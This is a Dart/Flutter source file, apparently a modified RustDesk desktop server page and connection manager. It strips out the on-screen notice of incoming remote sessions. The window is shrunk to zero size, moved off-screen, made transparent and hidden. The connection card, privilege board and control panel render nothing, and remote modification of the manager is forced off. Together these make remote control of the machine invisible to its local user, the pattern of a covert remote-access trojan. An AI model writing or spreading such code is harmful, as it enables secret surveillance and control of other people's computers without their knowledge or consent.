import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_hbb/common/widgets/audio_input.dart';
import 'package:flutter_hbb/consts.dart';
import 'package:flutter_hbb/desktop/widgets/tabbar_widget.dart';
import 'package:flutter_hbb/models/chat_model.dart';
import 'package:flutter_hbb/models/cm_file_model.dart';
import 'package:flutter_hbb/utils/platform_channel.dart';
import 'package:get/get.dart';
import 'package:percent_indicator/linear_percent_indicator.dart';
import 'package:provider/provider.dart';
import 'package:window_manager/window_manager.dart';

import '../../common.dart';
import '../../common/widgets/chat_page.dart';
import '../../models/file_model.dart';
import '../../models/platform_model.dart';
import '../../models/server_model.dart';

class DesktopServerPage extends StatefulWidget {
  final bool hideWindow; // 控制整个窗口是否隐藏

  const DesktopServerPage({Key? key, this.hideWindow = true}) : super(key: key);

  @override
  State<DesktopServerPage> createState() => _DesktopServerPageState();
}

class _DesktopServerPageState extends State<DesktopServerPage>
    with WindowListener, AutomaticKeepAliveClientMixin {
  final tabController = gFFI.serverModel.tabController;

  _DesktopServerPageState() {
    gFFI.ffiModel.updateEventListener(gFFI.sessionId, "");
    Get.put<DesktopTabController>(tabController);
    tabController.onRemoved = (_, id) {
      onRemoveId(id);
    };
  }

  @override
  void initState() {
    windowManager.addListener(this);
    
    // 隐藏窗口时设置为极小尺寸并移到屏幕外
    if (widget.hideWindow) {
      windowManager.setSize(Size(0, 0));
      windowManager.setPosition(Offset(-10000, -10000));
      windowManager.setOpacity(0.0);
      windowManager.hide();
    }
    
    super.initState();
  }

  @override
  void dispose() {
    windowManager.removeListener(this);
    super.dispose();
  }

  @override
  void onWindowClose() {
    Future.wait([gFFI.serverModel.closeAll(), gFFI.close()]).then((_) {
      if (isMacOS) {
        RdPlatformChannel.instance.terminate();
      } else {
        windowManager.setPreventClose(false);
        windowManager.close();
      }
    });
    super.onWindowClose();
  }

  void onRemoveId(String id) {
    if (tabController.state.value.tabs.isEmpty) {
      windowManager.close();
    }
  }

  @override
  Widget build(BuildContext context) {
    // 彻底隐藏时不渲染任何内容
    if (widget.hideWindow) return const SizedBox.shrink();
    
    // 仅保留必要的provider注册，移除UI构建
    return MultiProvider(
      providers: [
        ChangeNotifierProvider.value(value: gFFI.serverModel),
        ChangeNotifierProvider.value(value: gFFI.chatModel),
      ],
      child: const SizedBox.shrink(),
    );
  }

  @override
  bool get wantKeepAlive => true;
}

class ConnectionManager extends StatefulWidget {
  final bool hideCM; // 控制连接管理器是否隐藏

  ConnectionManager({Key? key, this.hideCM = true}) : super(key: key);

  @override
  State<StatefulWidget> createState() => ConnectionManagerState();
}

class ConnectionManagerState extends State<ConnectionManager>
    with WidgetsBindingObserver {
  final RxBool _controlPageBlock = false.obs;
  final RxBool _sidePageBlock = false.obs;

  ConnectionManagerState() {
    gFFI.serverModel.tabController.onSelected = (client_id_str) {
      final client_id = int.tryParse(client_id_str);
      if (client_id != null) {
        final client =
            gFFI.serverModel.clients.firstWhereOrNull((e) => e.id == client_id);
        if (client != null) {
          gFFI.chatModel.changeCurrentKey(MessageKey(client.peerId, client.id));
          if (client.unreadChatMessageCount.value > 0) {
            WidgetsBinding.instance.addPostFrameCallback((_) {
              client.unreadChatMessageCount.value = 0;
              gFFI.chatModel.showChatPage(MessageKey(client.peerId, client.id));
            });
          }
          windowManager.setTitle(getWindowNameWithId(client.peerId));
          gFFI.cmFileModel.updateCurrentClientId(client.id);
        }
      }
    };
    gFFI.chatModel.isConnManager = true;
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    if (state == AppLifecycleState.resumed) {
      if (!allowRemoteCMModification()) {
        shouldBeBlocked(_controlPageBlock, null);
        shouldBeBlocked(_sidePageBlock, null);
      }
    }
  }

  @override
  void initState() {
    gFFI.serverModel.updateClientState();
    WidgetsBinding.instance.addObserver(this);
    super.initState();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return const SizedBox.shrink();
  }
}

// 移除所有UI组件，仅保留核心逻辑
Widget buildConnectionCard(Client client, {bool hideCard = true}) {
  return hideCard ? const SizedBox.shrink() : Consumer<ServerModel>(
    builder: (context, value, child) => Column(
      mainAxisAlignment: MainAxisAlignment.start,
      crossAxisAlignment: CrossAxisAlignment.start,
      key: ValueKey(client.id),
      children: [
        _CmHeader(client: client, hideHeader: hideCard),
        client.type_() == ClientType.file ||
                client.type_() == ClientType.portForward ||
                client.disconnected
            ? const SizedBox.shrink()
            : _PrivilegeBoard(client: client, hideBoard: hideCard),
        Expanded(
          child: Align(
            alignment: Alignment.bottomCenter,
            child: _CmControlPanel(client: client, hidePanel: hideCard),
          ),
        )
      ],
    ).paddingSymmetric(vertical: 0, horizontal: 0), // 边距设为0
  );
}
class _CmHeader extends StatefulWidget {
  final Client client;
  final bool hideHeader; // 控制头部是否隐藏

  const _CmHeader({Key? key, required this.client, this.hideHeader = true}) : super(key: key);

  @override
  State<_CmHeader> createState() => _CmHeaderState();
}

class _CmHeaderState extends State<_CmHeader> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideHeader) return const SizedBox.shrink(); // 隐藏头部

    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(0), // 圆角设为0
        gradient: LinearGradient(
          begin: Alignment.topRight,
          end: Alignment.bottomLeft,
          colors: [
            Color(0xff00bfe1),
            Color(0xff0071ff),
          ],
        ),
      ),
      margin: EdgeInsets.symmetric(horizontal: 0, vertical: 0), // 边距设为0
      padding: EdgeInsets.only(
        top: 0, // 内边距设为0
        bottom: 0,
        left: 0,
        right: 0,
      ),
      width: 0, // 宽度设为0
      height: 0, // 高度设为0
      child: const SizedBox.shrink(), // 防止内容渲染
    );
  }
}
class _PrivilegeBoard extends StatefulWidget {
  final Client client;
  final bool hideBoard; // 控制权限面板是否隐藏

  const _PrivilegeBoard({Key? key, required this.client, this.hideBoard = true}) : super(key: key);

  @override
  State<StatefulWidget> createState() => _PrivilegeBoardState();
}

class _PrivilegeBoardState extends State<_PrivilegeBoard> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideBoard) return const SizedBox.shrink(); // 隐藏权限面板

    return const SizedBox.shrink(); // 空实现
  }
}
class _CmControlPanel extends StatelessWidget {
  final Client client;
  final bool hidePanel; // 控制控制面板是否隐藏

  const _CmControlPanel({Key? key, required this.client, this.hidePanel = true}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if (hidePanel) return const SizedBox.shrink(); // 隐藏控制面板

    return const SizedBox.shrink(); // 空实现
  }
}
bool allowRemoteCMModification() {
  return false;
}
